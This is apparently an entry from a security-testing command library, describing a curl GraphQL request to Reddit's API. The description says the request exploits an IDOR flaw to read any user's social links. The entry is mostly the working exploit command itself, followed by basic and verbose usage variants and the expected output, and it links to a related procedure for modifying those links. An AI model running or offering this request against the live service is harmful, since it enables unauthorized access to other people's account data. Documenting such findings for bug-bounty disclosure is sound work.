---
id: cmd-uuid-1
data: >-
  curl -X POST https://gql.reddit.com/ -H "Authorization: Bearer $TOKEN" -H
  "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0;
  Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0
  Safari/531.36" -d '{"id":"11a239b07f86","variables":{"username":"$USERNAME"}}'
tags:
  - graphql
  - fetch
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2024-01-01T12:00:00Z'
updated_at: '2025-12-14T17:25:48.141Z'
verified: false
validated: true
submitted: true
---
# graphql-fetch-reddit-social-links

## Command

```bash
curl -X POST https://gql.reddit.com/ -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/531.36" -d '{"id":"11a239b07f86","variables":{"username":"$USERNAME"}}'
```

## Description

This curl command sends a GraphQL POST request to Reddit's API to fetch social links for a specified username, exploiting IDOR to access any user's data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $TOKEN | Reddit Bearer authentication token | Yes |
| $USERNAME | Target Reddit username (e.g., criptexhackerone1) | Yes |

## Examples

### Basic Usage

```bash
TOKEN="your_bearer_token" USERNAME="targetuser" curl -X POST https://gql.reddit.com/ -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"id":"11a239b07f86","variables":{"username":"$USERNAME"}}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST https://gql.reddit.com/ -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"id":"11a239b07f86","variables":{"username":"$USERNAME"}}'
```

## Expected Output

JSON response with structure including {"data":{"user":{"socialLinks":[{"id":"unique_id","outboundUrl":"...","title":"...","type":"..."}]}}}

## Related

- [[commands/graphql-modify-reddit-social-link]]
- [[procedures/Fetch-Reddit-User-Social-Links-via-IDOR]]
